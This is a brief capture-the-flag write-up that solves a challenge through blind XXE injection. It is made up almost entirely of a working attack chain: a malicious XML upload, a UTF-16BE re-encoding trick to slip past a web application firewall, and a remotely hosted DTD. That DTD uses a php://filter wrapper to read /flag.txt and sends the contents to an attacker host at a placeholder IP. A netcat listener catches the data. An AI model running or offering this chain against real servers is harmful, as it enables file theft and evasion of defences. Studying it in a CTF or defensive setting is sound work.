Create xxe.xml with content:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://IP.IP.IP.IP/dtd.xml">
%sp;
%doit;
]>
<users><user>
<username>ivy</username>
<password>passwd1</password>
<r>&exfil;</r>
<name>name</name>
<email>mail</email>
<group>GRP</group>
</user></users>
```

Convert to UTF-16BE to bypass WAF:
```bash
$ iconv -f US-ASCII -t UTF-16BE /tmp/q.xml > /tmp/qq.xml
```

On server host file `dtd.xml` with content:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % doit "<!ENTITY exfil SYSTEM 'http://IP.IP.IP.IP:8000/dtd.xml?%data;'>">
```

Start `nc -lvp 8000` and wait.

Upload `xxe.xml`.

???

Profit:
```bash
$ echo "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQpmbGFne24wd19pJ21fc0BkX2N1el95MHVfZzN0X3RoM19mbDRnX2J1dF9jMG5ncjR0c30KQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=" | base64 -d

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
